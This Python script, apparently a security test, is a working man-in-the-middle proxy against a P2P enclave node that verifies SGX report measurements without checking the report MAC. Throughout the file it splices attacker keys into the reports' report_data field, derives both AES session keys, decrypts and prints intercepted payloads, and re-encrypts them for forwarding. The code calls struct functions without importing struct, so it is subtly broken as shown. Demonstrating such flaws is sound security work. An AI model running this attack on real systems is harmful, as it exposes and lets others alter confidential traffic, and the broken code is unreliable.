#!/usr/bin/env python3
"""
Active Man-In-The-Middle (MITM) Proxy for Confidential P2P Node (Test T4)
Demonstrates that verifying MRENCLAVE/MRSIGNER without cryptographic MAC
validation (sgx_verify_report) allows an active attacker to splice valid
NIST P-256 ephemeral keys into report_data (bytes 320..383), derive both
AES-128 session keys, decrypt payloads in transit, and re-encrypt them.
"""

import argparse
import hashlib
import os
import socket
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

SGX_TARGET_INFO_SIZE = 512
SGX_REPORT_SIZE = 432
REPORT_DATA_OFFSET = 320
REPORT_DATA_SIZE = 64
ECP256_KEY_SIZE = 32
AESGCM_IV_SIZE = 12
AESGCM_TAG_SIZE = 16


def recv_exact(sock: socket.socket, num_bytes: int) -> bytes:
    """Read an exact number of bytes from a TCP socket."""
    buf = bytearray()
    while len(buf) < num_bytes:
        chunk = sock.recv(num_bytes - len(buf))
        if not chunk:
            raise ConnectionError(f"Socket closed after {len(buf)}/{num_bytes} bytes")
        buf.extend(chunk)
    return bytes(buf)


def pubkey_to_sgx_bytes(pub_key: ec.EllipticCurvePublicKey) -> bytes:
    """Serialize a NIST P-256 public key into SGX 64-byte little-endian (gx || gy)."""
    nums = pub_key.public_numbers()
    gx_le = nums.x.to_bytes(ECP256_KEY_SIZE, byteorder="little")
    gy_le = nums.y.to_bytes(ECP256_KEY_SIZE, byteorder="little")
    return gx_le + gy_le


def sgx_bytes_to_pubkey(sgx_pub: bytes) -> ec.EllipticCurvePublicKey:
    """Deserialize SGX 64-byte little-endian (gx || gy) into a NIST P-256 public key."""
    if len(sgx_pub) != REPORT_DATA_SIZE:
        raise ValueError("Invalid SGX public key length")
    x = int.from_bytes(sgx_pub[:ECP256_KEY_SIZE], byteorder="little")
    y = int.from_bytes(sgx_pub[ECP256_KEY_SIZE:], byteorder="little")
    return ec.EllipticCurvePublicNumbers(x, y, ec.SECP256R1()).public_key()


def derive_sgx_aes128_key(priv_key: ec.EllipticCurvePrivateKey, peer_pub_key: ec.EllipticCurvePublicKey) -> bytes:
    """
    Compute the ECDH shared secret and apply the exact Enclave KDF:
    1. Compute raw X coordinate (big-endian from cryptography)
    2. Convert to 32-byte little-endian (sgx_ec256_dh_shared_t)
    3. SHA-256 hash and truncate to first 16 bytes (AES-128)
    """
    shared_secret_be = priv_key.exchange(ec.ECDH(), peer_pub_key)
    shared_secret_le = shared_secret_be[::-1]
    digest = hashlib.sha256(shared_secret_le).digest()
    return digest[:16]


def splice_report_data(raw_report: bytes, forged_pubkey_bytes: bytes) -> bytes:
    """Replace the 64-byte report_data field (offset 320..383) inside a 432-byte sgx_report_t."""
    if len(raw_report) != SGX_REPORT_SIZE:
        raise ValueError(f"Expected {SGX_REPORT_SIZE}-byte SGX Report, got {len(raw_report)}")
    forged = bytearray(raw_report)
    forged[REPORT_DATA_OFFSET : REPORT_DATA_OFFSET + REPORT_DATA_SIZE] = forged_pubkey_bytes
    return bytes(forged)


def decrypt_sgx_packet(aes_key: bytes, packet: bytes) -> bytes:
    """Decrypt SGX Enclave packet layout: [IV (12B) | GCM TAG (16B) | CIPHERTEXT]."""
    if len(packet) <= AESGCM_IV_SIZE + AESGCM_TAG_SIZE:
        raise ValueError("Encrypted packet too short")
    iv = packet[:AESGCM_IV_SIZE]
    tag = packet[AESGCM_IV_SIZE : AESGCM_IV_SIZE + AESGCM_TAG_SIZE]
    ciphertext = packet[AESGCM_IV_SIZE + AESGCM_TAG_SIZE :]
    # cryptography AESGCM expects ciphertext + tag concatenated
    return AESGCM(aes_key).decrypt(iv, ciphertext + tag, None)


def encrypt_sgx_packet(aes_key: bytes, plaintext: bytes) -> bytes:
    """Encrypt plaintext into SGX Enclave packet layout: [IV (12B) | GCM TAG (16B) | CIPHERTEXT]."""
    iv = os.urandom(AESGCM_IV_SIZE)
    ct_and_tag = AESGCM(aes_key).encrypt(iv, plaintext, None)
    ciphertext = ct_and_tag[:-AESGCM_TAG_SIZE]
    tag = ct_and_tag[-AESGCM_TAG_SIZE:]
    return iv + tag + ciphertext


def handle_mitm_session(client_sock: socket.socket, client_addr, target_ip: str, target_port: int):
    print(f"\n==================== [MITM INTERCEPT ACTIVE] ====================")
    print(f"[MITM] Intercepted incoming connection from {client_addr[0]}:{client_addr[1]}")

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((target_ip, target_port))
        print(f"[MITM] Connected to upstream target node {target_ip}:{target_port}")
        
        # 0. Relay 512-byte sgx_target_info_t exchange in both directions
        client_ti = recv_exact(client_sock, SGX_TARGET_INFO_SIZE)
        server_sock.sendall(client_ti)
        server_ti = recv_exact(server_sock, SGX_TARGET_INFO_SIZE)
        client_sock.sendall(server_ti)
        print(f"[MITM] Relayed sgx_target_info_t ({SGX_TARGET_INFO_SIZE} bytes) in both directions.")

        # Generate two independent valid NIST P-256 keypairs (one facing Client, one facing Server)
        mitm_priv_for_client = ec.generate_private_key(ec.SECP256R1())
        mitm_pub_for_client_sgx = pubkey_to_sgx_bytes(mitm_priv_for_client.public_key())

        mitm_priv_for_server = ec.generate_private_key(ec.SECP256R1())
        mitm_pub_for_server_sgx = pubkey_to_sgx_bytes(mitm_priv_for_server.public_key())

        # 1. Intercept Client SGX Report (432 bytes)
        client_report = recv_exact(client_sock, SGX_REPORT_SIZE)
        client_orig_pub = sgx_bytes_to_pubkey(
            client_report[REPORT_DATA_OFFSET : REPORT_DATA_OFFSET + REPORT_DATA_SIZE]
        )
        print(f"[MITM] Captured Client SGX Report ({len(client_report)} bytes). Splicing attacker P-256 key into report_data...")

        # Forward legitimate Client Report header/MRENCLAVE with attacker's public key to Server
        forged_client_report = splice_report_data(client_report, mitm_pub_for_server_sgx)
        server_sock.sendall(forged_client_report)

        # 2. Intercept Server SGX Report (432 bytes)
        server_report = recv_exact(server_sock, SGX_REPORT_SIZE)
        server_orig_pub = sgx_bytes_to_pubkey(
            server_report[REPORT_DATA_OFFSET : REPORT_DATA_OFFSET + REPORT_DATA_SIZE]
        )
        print(f"[MITM] Captured Server SGX Report ({len(server_report)} bytes). Splicing attacker P-256 key into report_data...")

        # Forward legitimate Server Report header/MRENCLAVE with attacker's public key to Client
        forged_server_report = splice_report_data(server_report, mitm_pub_for_client_sgx)
        client_sock.sendall(forged_server_report)

        # 3. Derive both independent AES-128 session keys
        key_client_side = derive_sgx_aes128_key(mitm_priv_for_client, client_orig_pub)
        key_server_side = derive_sgx_aes128_key(mitm_priv_for_server, server_orig_pub)
        print(f"[MITM] Derived Client-side AES-128 key : {key_client_side.hex()}")
        print(f"[MITM] Derived Server-side AES-128 key : {key_server_side.hex()}")

        # 4. Intercept 4-byte frame length + AES-GCM encrypted payload
        raw_len = recv_exact(client_sock, 4)
        payload_len = struct.unpack("!I", raw_len)[0]
        encrypted_packet = recv_exact(client_sock, payload_len)

        print(f"[MITM] Intercepted AES-GCM stream ({len(encrypted_packet)} bytes) from Client.")
        plaintext = decrypt_sgx_packet(key_client_side, encrypted_packet)
        print(f"[CRITICAL BREACH] Decrypted Plaintext in transit: {plaintext.decode('utf-8', errors='replace')}")

        # Re-encrypt with Server-side session key and forward with 4-byte length prefix
        reencrypted_packet = encrypt_sgx_packet(key_server_side, plaintext)
        server_sock.sendall(struct.pack("!I", len(reencrypted_packet)) + reencrypted_packet)
        
        print(f"[MITM] Re-encrypted and forwarded payload ({len(reencrypted_packet)} bytes) to Server.")
        print("=================================================================\n")

    except Exception as e:
        print(f"[MITM Error/Rejected] Session aborted: {e}")
    finally:
        server_sock.close()
        client_sock.close()


def main():
    parser = argparse.ArgumentParser(description="Active NIST P-256 MITM Proxy for SGX Report Splicing")
    parser.add_argument("--listen-host", default="0.0.0.0", help="Local bind address (default: 0.0.0.0)")
    parser.add_argument("--listen-port", type=int, default=9090, help="Local listening port (default: 9090)")
    parser.add_argument("--target-ip", default="172.20.0.11", help="Target server IP (default: 172.20.0.11)")
    parser.add_argument("--target-port", type=int, default=8080, help="Target server port (default: 8080)")
    args = parser.parse_args()

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.listen_host, args.listen_port))
    listener.listen(5)

    print(f"[*] Active MITM Proxy listening on {args.listen_host}:{args.listen_port} -> forwarding to {args.target_ip}:{args.target_port}")
    try:
        while True:
            client_sock, client_addr = listener.accept()
            handle_mitm_session(client_sock, client_addr, args.target_ip, args.target_port)
    except KeyboardInterrupt:
        print("\n[*] Shutting down MITM proxy.")
    finally:
        listener.close()


if __name__ == "__main__":
    main()
